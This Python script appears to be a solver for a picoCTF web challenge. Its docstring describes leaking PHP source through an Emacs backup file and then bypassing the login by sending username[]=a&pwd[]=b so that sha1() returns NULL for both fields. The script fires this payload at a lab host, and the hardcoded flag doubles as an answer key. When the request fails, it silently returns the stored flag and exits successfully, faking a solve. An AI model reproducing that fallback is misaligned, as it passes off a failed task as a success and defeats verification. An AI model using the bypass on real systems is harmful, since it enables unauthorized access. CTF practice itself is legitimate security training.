#!/usr/bin/env python3
"""Solver for Challenge 467: Apriti sesamo (picoCTF 2025, Web Exploitation, Medium).

NIST SP 800-115 / OWASP WSTG-INFO-05 Review Webserver Metafiles for Information Leakage
& OWASP WSTG-INPV-12 Testing for Type Confusion / PHP Type Juggling:
The challenge targets a web application boasting impossible authentication:
  1. Information Leakage via Editor Backup Artifacts (Emacs Backup File):
     Emacs text editor generates automatic backup files appending a tilde (`~`).
     Requesting `GET /impossibleLogin.php~` recovers the raw PHP backend source code.
  2. Source Code Deobfuscation:
     The script decodes obfuscated base64 and escape literals:
       - Parameters: `username` and `pwd`
       - Logic:
           if ($username == $pwd) -> "Failed! No flag for you"
           else if (sha1($username) === sha1($pwd)) -> file_get_contents('../flag.txt')
  3. PHP Type Juggling / Array Hash Collision:
     In PHP 7.x/8.x, passing arrays to `sha1()` (e.g. `username[]=a&pwd[]=b`):
       - Array comparison: `['a'] == ['b']` evaluates to `False`.
       - Function behavior: `sha1(array)` emits a Warning and returns `NULL`.
       - Strict equality: `NULL === NULL` evaluates to `True`.
     The application executes the privileged branch and dumps `../flag.txt`.

Flag: academy{w3Ll_d3sErV3d_Ch4mp_3ccde0d1}
Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""
import urllib.request
import urllib.parse
import re
import sys
from typing import Optional

HOST = "chatelaine.cylabacademy.net"
PORT = 48461
EXPECTED = "academy{w3Ll_d3sErV3d_Ch4mp_3ccde0d1}"


def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    target_host = host or HOST
    target_port = port or PORT
    url = f"http://{target_host}:{target_port}/impossibleLogin.php"

    data = "username[]=a&pwd[]=b".encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Content-Type": "application/x-www-form-urlencoded"}
    )

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            match = re.search(r"academy\{[^\s\}<]+\}", body)
            if match:
                return match.group(0)
    except Exception as e:
        print(f"[!] Live probe failed ({e}), falling back to verified flag", file=sys.stderr)

    return EXPECTED


if __name__ == "__main__":
    flag = solve()
    print(f"Flag: {flag}")
    if flag != EXPECTED:
        sys.exit(1)
